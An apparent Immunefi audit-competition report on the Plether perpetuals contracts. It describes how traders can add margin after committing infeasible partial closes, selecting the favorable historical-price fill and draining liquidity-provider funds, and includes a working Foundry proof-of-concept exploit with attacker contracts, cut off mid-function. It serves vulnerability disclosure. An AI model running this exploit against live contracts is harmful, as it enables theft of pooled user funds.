# \#99291 [SC-Low] Post-commit margin changes let traders select historical partial-close fills and extract LP cash

**Submitted on Nov 12th 2026 at 22:42:08 UTC by @Paludo0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99291
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A trader can commit partial closes whose post-position leverage bound is initially unsatisfiable, then make only the favorable close executable by adding margin immediately before execution. When an earlier order holds the global FIFO queue, this converts a binding historical-price order into a choice made after a later market move. The exercised close pays the trader from HousePool liquidity; the unexercised close fails terminally without settling the position.

## Vulnerability Details

### Affected source and root cause

The affected version is the competition's frozen perps source at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The relevant admission path is the public Router commitment flow. [`OrderLiquidationBatchLogic._validateFreshRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L283-L302) validates that `maxPostLeverageBps` is nonzero, but does not test whether the committed partial close can satisfy that bound against the account's existing margin:

```solidity
bytes32 currentConfigHash = host.lifecycleBook().currentExecutionConfigHash();
if (bounds.expectedConfigHash == bytes32(0) || bounds.expectedConfigHash != currentConfigHash) {
    revert OrderRouter__ExecutionConfigMismatch(bounds.expectedConfigHash, currentConfigHash);
}
if (bounds.maxPostLeverageBps == 0) {
    revert OrderRouter__ZeroPostLeverageBound();
}

OrderValidationLib.validateBaseCommit(request.sizeDelta, request.marginDelta, request.isClose);
```

The [complete admission function](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L270-L321) contains no feasibility check for the post-leverage bound. The position owner can subsequently change the exact input used by the execution check. [`CfdEngine.addMargin`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529) requires the position owner but does not reject a pending order:

```solidity
function addMargin(
    address account,
    uint256 amount
) external nonReentrant {
    if (msg.sender != account) {
        revert CfdEngine__NotAccountOwner();
    }
    if (amount == 0) {
        revert CfdEngine__ZeroAmount();
    }

    StoredPosition storage pos = _positions[account];
    if (pos.lots == 0) {
        revert CfdEngine__NoOpenPosition();
    }

    bytes32 expectedOldHash = _beginTerminalCurveMutation(account);
    _realizeCarryFromSettlement(account, pos);

    uint256 marginBefore = _positionMarginBucketAssets(account);
    clearinghouse.lockPositionMargin(account, amount);
    _sideState(pos.side).totalMargin += amount;
    _syncPositionBorrowBaseToMargin(pos, marginBefore + amount);
```

At execution, [`CfdOrderPolicyEvaluatorBase._enforceBounds`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L526-L539) evaluates the same committed bound against the now-live account state:

```solidity
if (fullClose) {
    return;
}

uint256 normalizedEquityAssets =
    assessment.postPositionEquityAssets > 0 ? uint256(assessment.postPositionEquityAssets) : 0;
if (assessment.postPositionEquityAssets < 0 || normalizedEquityAssets < bounds.minPostPositionEquityAssets) {
    revert ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation(
        OrderV3Types.ConstraintKind.PostPositionEquity,
        normalizedEquityAssets,
        bounds.minPostPositionEquityAssets
    );
}
_requireMaximum(OrderV3Types.ConstraintKind.PostLeverage, assessment.postLeverageBps, bounds.maxPostLeverageBps);
```

[`OrderRouterExecutionSidecar`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L879-L893) classifies that typed constraint violation as terminal:

```solidity
if (
    selector == ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector
        && revertData.length == 100
) {
    uint256 constraint = _word(revertData, 4);
    if (constraint > 0 && constraint <= uint256(OrderV3Types.ConstraintKind.PostLeverage)) {
        classification.terminal = true;
        classification.reason = OrderV3Types.TerminalReason.ConstraintViolation;
```

Thus a third party executing the committed order before the account tops up margin terminally fails it, while the account itself can make it pass by calling `addMargin` and `executeOrder` atomically. This is possible with a contract account that owns its own position; the attack does not impersonate another account or use an owner role. An ordinary close has zero reserved execution bounty under the frozen release policy.

### Reachable delayed execution and attack path

The PoC uses the recurring FX FAD transition as a deterministic queue delay. An open order committed immediately before close-only policy begins remains [`Pending(CloseOnly)`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L442-L444) at the FIFO head until its deadline. This queue behavior was already identified in the [published AI scan](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L60-L66). It is the timing enabler here, not the claimed root cause.

1. The attacker holds a LONG and a SHORT in separate funded contract accounts, plus a funded account for the queue-head open.
2. Immediately before the scheduled FAD transition, the attacker commits the open. After close-only begins, the attacker commits partial closes for both positions behind it. Each close has a post-leverage maximum its account cannot satisfy at commitment.
3. The first eligible Pyth basket after those commitments is fixed by [`PletherOracle`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L623), but neither partial close can be reached through the FIFO queue while the head remains pending. The attacker observes subsequent market movement.
4. When the head expires, the attacker sends one transaction that lets the losing partial close fail with `ConstraintViolation`, adds margin to the winning account, and executes that account's partial close using the first eligible historical basket. The account can place the margin addition immediately before execution in the same transaction.
5. The attacker closes the other exposure at the current basket, closes the residual positions, and withdraws the resulting USDG. The outcome no longer depends on keeping either position open or on an accounting write-off.

All relevant calls are public or made by the owner of the attacker's own position. A competing executor can cancel the initially infeasible closes after the queue head expires; the attacker must land the exercise transaction first. The deterministic queue delay does not require privileged control of a keeper or oracle service.

### Prior disclosures and remediation

This is distinct from the pre-audit [SC-M4](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf) finding and its [PR #24](https://github.com/Plether-Fi/plether-core/pull/24) fix. SC-M4 relied on keeper selection among multiple oracle ticks and an LP-withdrawal-induced refund. This PoC uses the first unique tick required by that fix, never manipulates pool depth, and does not invoke the refund or write-off path. [PR #113](https://github.com/Plether-Fi/plether-core/pull/113) funded and guarded a positive post-settlement floor for isolated first opens; it did not bind post-leverage feasibility on partial closes. The published FIFO close-only issue describes a delayed queue but not the post-commit change from an impossible partial close to an executable one. The [HIGH-1 clock issue](https://immunefi.com/audit-competition/plether/scope/) concerns a price already observed before commitment; here the tested first tick occurs after the close commitments and the decision follows a later tick.

Reject a partial close whose post-position bound is already unsatisfiable at commitment, and prevent later margin changes from granting a previously unavailable historical fill. One way to preserve margin top-ups is to require a new commitment after a state change that first makes the bound feasible.

## Impact Details

**Critical — Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.** The affected funds are LP-owned USDG backing HousePool positions, principally Junior liquidity in the tested pool. The bound is supposed to constrain the order's post-position risk, while the binding historical-price rule is supposed to deny the trader an option after commitment. The attacker controls the account margin used by that bound and selectively enables the favorable historical close after seeing a later price. The executed settlement transfers value from the pool to the attacker-controlled accounts; the accounts withdraw the proceeds. The PoC closes every position before measuring pool cash, so the shortfall is settled LP liquidity rather than an open-position mark. Its same-path controls establish that the transfer is caused by the post-commit choice, rather than by holding the LONG/SHORT pair or by a single favorable market direction.


## Proof of Concept

PoC Explanation

The separate PoC is the single file `BoundToggleEssentialPoC.t.sol`. Place it at `packages/perps/test/perps/poc/BoundToggleEssentialPoC.t.sol` in a checkout of the frozen commit, then run from the repository root:

```bash
forge test --root packages/perps --match-path test/perps/poc/BoundToggleEssentialPoC.t.sol -vv
```

The test uses the repository's `BasePerpTest` and changes no in-scope contract. Its fixture installs the release six-feed basket and uses the release VPI, margin, execution-fee, confidence and adverse-confidence parameters. It invokes the public Router commitment and execution paths and the Engine margin path. The attacker-controlled contract accounts restrict the atomic top-up and exercise call to their owner or authorized coordinator; a third party cannot supply that top-up. `MockPyth` and the mock USDG token replace out-of-scope components as allowed by the competition. Trusted admin calls occur only during fixture configuration, before the attack path.

The main test starts with `210,000` USDG across attacker-controlled accounts. `BasePerpTest` supplies `1,002,000` USDG of LP capital: `1,000,000` Junior deposit plus `1,000` Junior and `1,000` Senior seed. HousePool holds `1,002,000.019833` USDG after the positions are opened. A queue-head open is committed just before the Friday FAD transition. Both partial closes are committed after the transition. The first eligible basket is published after both close commitments; a later basket moves the EUR component by `1%`, with the other five components unchanged. The test runs both directions and compares the margin-enabled choice to unconditional first-basket and later-basket closes on the same price path. All positions are then fully closed and withdrawable settlement is transferred to the attacker wallets. The totals include the USDG execution fees, carry and bounty effects represented by the fixture:

| Price path | Selected historical close: attacker wallets | Unconditional first-basket close | Unconditional later-basket close | Pool cash after selection |
| --- | ---: | ---: | ---: | ---: |
| EUR down | `210,697.221961` | `209,243.978233` | `209,246.976102` | `1,001,058.426017` |
| EUR up | `210,338.004022` | `209,243.868981` | `209,240.858935` | `1,001,341.112150` |

The selected path gains `697.221961` or `338.004022` USDG over the initially funded attacker balances after the modeled USDG charges. HousePool cash falls below the LP-contributed capital, its pre-choice value and both same-path controls in each direction. The smaller selected-path gain leaves `338.004022` USDG for external ETH gas and Pyth/Hermes costs before net profitability is lost. Those external costs and the frequency of the tested FX move are not measured. Neither path uses a price-loss write-off.

A second test confirms that an initially infeasible partial close is admitted and then fails terminally at an unchanged price if a third party executes it before the owner adds margin. A third test removes the FAD queue pin and imposes delay through fixture timing; the margin change still alters the fill and pool cash, isolating the proposed root cause from the published close-only FIFO pin. That control does not establish ordinary keeper delay in production.

The exact command above was run against commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with Solidity `0.8.35`: `3 passed; 0 failed`. `vm.warp`, `vm.roll`, mock feeds and snapshot/revert controls construct deterministic timing and identical alternative market paths. The PoC instantiates one Friday FAD boundary; it does not establish historical FX-move frequency, signed-feed delivery timing, external execution costs, or transaction priority against another executor.

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IBoundToggleEngine {
    function addMargin(address account, uint256 amount) external;
}

interface IBoundToggleRouter {
    function executeOrder(uint64 orderId, bytes[] calldata updates)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory);
}

interface IBoundToggleClearinghouse {
    function depositMargin(uint256 amount) external;
    function withdrawMargin(uint256 amount) external;
}

contract BoundToggleAccount {
    address public immutable owner;
    mapping(address => bool) public authorized;

    constructor() {
        owner = msg.sender;
    }

    function authorize(address caller) external {
        require(msg.sender == owner, "only owner");
        authorized[caller] = true;
    }

    function exercise(address engine, address router, uint256 topUp, uint64 orderId, bytes[] calldata updates)
        external
        returns (OrderV3Types.ExecutionResult memory)
    {
        require(msg.sender == owner || authorized[msg.sender], "only owner");
        IBoundToggleEngine(engine).addMargin(address(this), topUp);
        return IBoundToggleRouter(router).executeOrder(orderId, updates);
    }

    function cashOut(address clearinghouse, uint256 amount) external {
        IBoundToggleClearinghouse(clearinghouse).withdrawMargin(amount);
    }
}

contract BoundToggleCoordinator {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function process(
        address engine,
        address router,
        address exerciseAccount,
        uint256 topUp,
        uint64 failId,
        uint64 exerciseId,
        bytes[] calldata updates,
        bool failFirst
    ) external returns (OrderV3Types.ExecutionResult memory failed, OrderV3Types.ExecutionResult memory exercised) {
        require(msg.sender == owner, "only owner");
        if (failFirst) {
            failed = IBoundToggleRouter(router).executeOrder(failId, updates);
        }
        exercised = BoundToggleAccount(exerciseAccount).exercise(engine, router, topUp, exerciseId, updates);
        if (!failFirst) {
            failed = IBoundToggleRouter(router).executeOrder(failId, updates);
        }
    }

    function cashOut(address clearinghouse, uint256 amount) external {
        IBoundToggleClearinghouse(clearinghouse).withdrawMargin(amount);
    }
}

/// @notice Frozen source: a82d4fefb02768e5b3bddcc97dee371eee24fea8.
/// @dev Only this test file is added to the repository; all in-scope contracts are unchanged.
contract BoundToggleEssentialPoC is BasePerpTest {
    enum Plan {
        Toggle,
        Early,
        Wait
    }

    struct Outcome {
        uint256 traderWallet;
        uint256 pinWallet;
        uint256 poolCash;
    }

    address internal constant KEEPER = address(0xBEEF);
    address internal constant PINNER = address(0xD00D);
    uint256 internal constant SIZE = 200_000e18;
    uint256 internal constant CLOSE_SIZE = 190_000e18;
    uint256 internal constant MARGIN = 10_000e6;
    uint256 internal constant SHORT_SIZE = 200_000e18;
    uint256 internal constant SHORT_CLOSE_SIZE = 190_000e18;
    uint256 internal constant SHORT_MARGIN = 10_000e6;
    uint256 internal constant TOP_UP = 4000e6;
    uint256 internal constant SHORT_TOP_UP = 4000e6;
    uint32 internal constant TIGHT_LEVERAGE = 150_000;
    // Friday 2024-03-15 20:29:59 UTC: last second before the recurring FAD window.
    uint256 internal constant FAD_BOUNDARY = 1_710_534_599;

    IOrderLifecycleBook internal book;
    BoundToggleAccount internal account;
    address internal trader;
    uint256 internal nonce;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.initMarginBps = 20;
        p.maintMarginBps = 10;
    }

    function _eurMoveBps() internal pure virtual returns (uint256) {
        return 100;
    }

    function setUp() public override {
        super.setUp();
        book = IOrderLifecycleBook(address(router.lifecycleBook()));
        account = new BoundToggleAccount();
        trader = address(account);
        _installReleaseBasket();
        _fundTrader(trader, 100_000e6);

        uint256 openedAt = block.timestamp + 1;
        vm.warp(openedAt);
        router.updateMarkPrice(_tick(uint64(openedAt), uint64(openedAt - 1), 0));
        OrderV3Types.OrderRequest memory open = _request(false, SIZE, MARGIN, type(uint32).max);
        vm.prank(trader);
        uint64 openId = router.commitOrder(open);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(openedAt + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(openId, _tick(uint64(openedAt + 1), uint64(openedAt), 0));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(_positionSize(trader), SIZE);
    }

    function _ids() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _weights() internal pure returns (uint256[] memory w) {
        w = new uint256[](6);
        w[0] = 576e15;
        w[1] = 136e15;
        w[2] = 119e15;
        w[3] = 91e15;
        w[4] = 42e15;
        w[5] = 36e15;
    }

    function _bases() internal pure returns (uint256[] memory b) {
        b = new uint256[](6);
        b[0] = 117_500_000;
        b[1] = 638_000;
        b[2] = 134_480_000;
        b[3] = 72_880_000;
        b[4] = 10_860_000;
        b[5] = 126_100_000;
    }

    function _inversions() internal pure returns (bool[] memory inv) {
        inv = new bool[](6);
        inv[1] = true;
        inv[3] = true;
        inv[4] = true;
        inv[5] = true;
    }

    function _tick(uint64 publishTime, uint64 prevPublishTime, int8 eurMove)
        internal
        pure
        returns (bytes[] memory data)
    {
        bytes32[] memory ids = _ids();
        uint256[] memory bases = _bases();
        bool[] memory inv = _inversions();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw = inv[i] ? 1e16 / bases[i] : bases[i];
            if (i == 0 && eurMove < 0) {
                raw = raw * (10_000 - _eurMoveBps()) / 10_000;
            }
            if (i == 0 && eurMove > 0) {
                raw = raw * (10_000 + _eurMoveBps()) / 10_000;
            }
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(raw)), uint64(raw / 10_000), -8, publishTime, prevPublishTime)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _installReleaseBasket() internal {
        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), _ids(), _weights(), _bases(), _inversions()
        );
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(pletherOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        vm.warp(block.timestamp + 2 days);
        uint64 nowTime = uint64(block.timestamp);
        router.updateMarkPrice(_tick(nowTime, nowTime - 1, 0));
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10);
        assertEq(engine.executionFeeBps(), 4);
    }

    function _request(bool close, uint256 size, uint256 margin, uint32 leverage)
        internal
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = bytes32(uint256(0xB0B00000) + ++nonce);
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = close ? 0 : margin;
        request.targetPrice = close ? type(uint256).max : 1;
        request.isClose = close;
        request.bounds.submitBy = uint64(block.timestamp + 120);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = book.currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = close ? 0 : type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = leverage;
    }

    function _positionSize(address owner) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(owner);
    }

    function _closeRemainder(uint256 c, int8 eurMove) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 42);
        OrderV3Types.OrderRequest memory req = _request(true, SIZE - CLOSE_SIZE, 0, type(uint32).max);
        vm.prank(trader);
        uint64 id = router.commitOrder(req);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 43);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(id, _tick(uint64(c + 43), uint64(c + 42), eurMove));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(_positionSize(trader), 0);
    }

    function _runWithoutPin(uint256 c, bool exerciseOldClose) internal returns (uint256 wallet, uint256 poolCash) {
        uint64 oldId;
        if (exerciseOldClose) {
            OrderV3Types.OrderRequest memory req = _request(true, CLOSE_SIZE, 0, TIGHT_LEVERAGE);
            vm.prank(trader);
            oldId = router.commitOrder(req);
        }
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 20);
        router.updateMarkPrice(_tick(uint64(c + 20), uint64(c + 19), 1));
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 31);
        if (exerciseOldClose) {
            OrderV3Types.ExecutionResult memory oldResult =
                account.exercise(address(engine), address(router), TOP_UP, oldId, _tick(uint64(c + 1), uint64(c), 0));
            assertEq(uint8(oldResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        } else {
            OrderV3Types.OrderRequest memory laterReq = _request(true, CLOSE_SIZE, 0, type(uint32).max);
            vm.prank(trader);
            uint64 laterId = router.commitOrder(laterReq);
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(c + 32);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory laterResult =
                router.executeOrder(laterId, _tick(uint64(c + 32), uint64(c + 31), 1));
            assertEq(uint8(laterResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        }
        _closeRemainder(c, 1);
        poolCash = settlementToken.balanceOf(address(pool));
        account.cashOut(address(clearinghouse), engineAccountLens.getWithdrawableAssets(trader));
        wallet = settlementToken.balanceOf(trader);
    }

    function test_MarginToggleIsIndependentOfTheKnownFadQueuePin() public {
        uint256 c = FAD_BOUNDARY - 600;
        vm.warp(c);
        router.updateMarkPrice(_tick(uint64(c), uint64(c - 1), 0));
        uint256 snapshot = vm.snapshotState();
        (uint256 exercisedWallet, uint256 exercisedPool) = _runWithoutPin(c, true);
        vm.revertToState(snapshot);
        (uint256 waitWallet, uint256 waitPool) = _runWithoutPin(c, false);
        emit log_named_uint("no-pin exercised wallet", exercisedWallet);
        emit log_named_uint("no-pin wait wallet", waitWallet);
        emit log_named_uint("no-pin exercised pool cash", exercisedPool);
        emit log_named_uint("no-pin wait pool cash", waitPool);
        assertGt(exercisedWallet, waitWallet + 400e6);
        assertLt(exercisedPool, waitPool);
    }

    function test_InitiallyInfeasibleCloseIsAdmittedAndFailsAtTheSamePrice() public {
        uint256 c = block.timestamp + 1;
        vm.warp(c);
        router.updateMarkPrice(_tick(uint64(c), uint64(c - 1), 0));
        OrderV3Types.OrderRequest memory req = _request(true, CLOSE_SIZE, 0, TIGHT_LEVERAGE);
        vm.prank(trader);
        uint64 id = router.commitOrder(req);
        assertEq(_executionBountyReserve(id), 0);
        vm.expectRevert();
        vm.prank(KEEPER);
        account.exercise(address(engine), address(router), TOP_UP, id, _tick(uint64(c + 1), uint64(c), 0));
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, _tick(uint64(c + 1), uint64(c), 0));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(_positionSize(trader), SIZE);
    }

    function _runHedged(
        uint256 c,
        uint64 pinId,
        BoundToggleAccount shortAccount,
        BoundToggleCoordinator coordinator,
        int8 move,
        Plan plan
    ) internal returns (uint256 totalWallet, uint256 poolCash) {
        address shortTrader = address(shortAccount);
        uint64 longId;
        uint64 shortId;
        if (plan != Plan.Wait) {
            uint32 leverage = plan == Plan.Toggle ? TIGHT_LEVERAGE : type(uint32).max;
            OrderV3Types.OrderRequest memory longReq = _request(true, CLOSE_SIZE, 0, leverage);
            vm.prank(trader);
            longId = router.commitOrder(longReq);
            OrderV3Types.OrderRequest memory shortReq = _request(true, SHORT_CLOSE_SIZE, 0, leverage);
            shortReq.side = CfdTypes.Side.SHORT;
            shortReq.targetPrice = 1;
            vm.prank(shortTrader);
            shortId = router.commitOrder(shortReq);
            assertEq(_executionBountyReserve(longId), 0);
            assertEq(_executionBountyReserve(shortId), 0);
        }

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 3);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory pending = router.executeOrder(pinId, _tick(uint64(c + 1), uint64(c), 0));
        assertEq(uint8(pending.status), uint8(OrderV3Types.LifecycleStatus.Pending));
        vm.roll(vm.getBlockNumber() + 47);
        vm.warp(c + 50);
        router.updateMarkPrice(_tick(uint64(c + 50), uint64(c + 49), move));
        vm.roll(vm.getBlockNumber() + 11);
        vm.warp(c + 61);

        bool down = move < 0;
        if (plan == Plan.Toggle) {
            (OrderV3Types.ExecutionResult memory failed, OrderV3Types.ExecutionResult memory exercised) = coordinator.process(
                address(engine),
                address(router),
                down ? shortTrader : trader,
                down ? SHORT_TOP_UP : TOP_UP,
                down ? longId : shortId,
                down ? shortId : longId,
                _tick(uint64(c + 3), uint64(c + 2), 0),
                down
            );
            assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
            assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
            assertEq(uint8(exercised.status), uint8(OrderV3Types.LifecycleStatus.Executed));

            OrderV3Types.OrderRequest memory laterReq =
                _request(true, down ? CLOSE_SIZE : SHORT_CLOSE_SIZE, 0, type(uint32).max);
            laterReq.side = down ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
            if (!down) {
                laterReq.targetPrice = 1;
            }
            vm.prank(down ? trader : shortTrader);
            uint64 laterId = router.commitOrder(laterReq);
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(c + 62);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory later =
                router.executeOrder(laterId, _tick(uint64(c + 62), uint64(c + 61), move));
            assertEq(uint8(later.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        } else if (plan == Plan.Early) {
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory earlyLong =
                router.executeOrder(longId, _tick(uint64(c + 3), uint64(c + 2), 0));
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory earlyShort =
                router.executeOrder(shortId, _tick(uint64(c + 3), uint64(c + 2), 0));
            assertEq(uint8(earlyLong.status), uint8(OrderV3Types.LifecycleStatus.Executed));
            assertEq(uint8(earlyShort.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        } else {
            OrderV3Types.OrderRequest memory lateLong = _request(true, CLOSE_SIZE, 0, type(uint32).max);
            vm.prank(trader);
            uint64 lateLongId = router.commitOrder(lateLong);
            OrderV3Types.OrderRequest memory lateShort = _request(true, SHORT_CLOSE_SIZE, 0, type(uint32).max);
            lateShort.side = CfdTypes.Side.SHORT;
            lateShort.targetPrice = 1;
            vm.prank(shortTrader);
            uint64 lateShortId = router.commitOrder(lateShort);
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(c + 62);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory currentLong =
                router.executeOrder(lateLongId, _tick(uint64(c + 62), uint64(c + 61), move));
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory currentShort =
                router.executeOrder(lateShortId, _tick(uint64(c + 62), uint64(c + 61), move));
            assertEq(uint8(currentLong.status), uint8(OrderV3Types.LifecycleStatus.Executed));
            assertEq(uint8(currentShort.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        }

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 72);
        OrderV3Types.OrderRequest memory longRemainder = _request(true, SIZE - CLOSE_SIZE, 0, type(uint32).max);
        vm.prank(trader);
        uint64 longRemainderId = router.commitOrder(longRemainder);
        OrderV3Types.OrderRequest memory shortRemainder =
            _request(true, SHORT_SIZE - SHORT_CLOSE_SIZE, 0, type(uint32).max);
        shortRemainder.side = CfdTypes.Side.SHORT;
        shortRemainder.targetPrice = 1;
        vm.prank(shortTrader);
        uint64 shortRemainderId = router.commitOrder(shortRemainder);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 73);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory closeLong =
            router.executeOrder(longRemainderId, _tick(uint64(c + 73), uint64(c + 72), move));
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory closeShort =
            router.executeOrder(shortRemainderId, _tick(uint64(c + 73), uint64(c + 72), move));
        assertEq(uint8(closeLong.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(uint8(closeShort.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(_positionSize(trader), 0);
        assertEq(_positionSize(shortTrader), 0);

        poolCash = settlementToken.balanceOf(address(pool));
        account.cashOut(address(clearinghouse), engineAccountLens.getWithdrawableAssets(trader));
        shortAccount.cashOut(address(clearinghouse), engineAccountLens.getWithdrawableAssets(shortTrader));
        uint256 pinWithdrawable = engineAccountLens.getWithdrawableAssets(PINNER);
        vm.prank(PINNER);
        clearinghouse.withdrawMargin(pinWithdrawable);
        coordinator.cashOut(address(clearinghouse), engineAccountLens.getWithdrawableAssets(address(coordinator)));
        totalWallet = settlementToken.balanceOf(trader) + settlementToken.balanceOf(shortTrader)
            + settlementToken.balanceOf(PINNER) + settlementToken.balanceOf(address(coordinator));
    }

    function test_HedgedBoundsProfitInEitherPriceDirectionWithoutWriteOff() public {
        BoundToggleAccount shortAccount = new BoundToggleAccount();
        BoundToggleCoordinator coordinator = new BoundToggleCoordinator();
        account.authorize(address(coordinator));
        shortAccount.authorize(address(coordinator));
        address shortTrader = address(shortAccount);
        _fundTrader(shortTrader, 100_000e6);
        uint256 openedAt = block.timestamp + 1;
        vm.warp(openedAt);
        router.updateMarkPrice(_tick(uint64(openedAt), uint64(openedAt - 1), 0));
        OrderV3Types.OrderRequest memory shortOpen = _request(false, SHORT_SIZE, SHORT_MARGIN, type(uint32).max);
        shortOpen.side = CfdTypes.Side.SHORT;
        shortOpen.targetPrice = type(uint256).max;
        vm.prank(shortTrader);
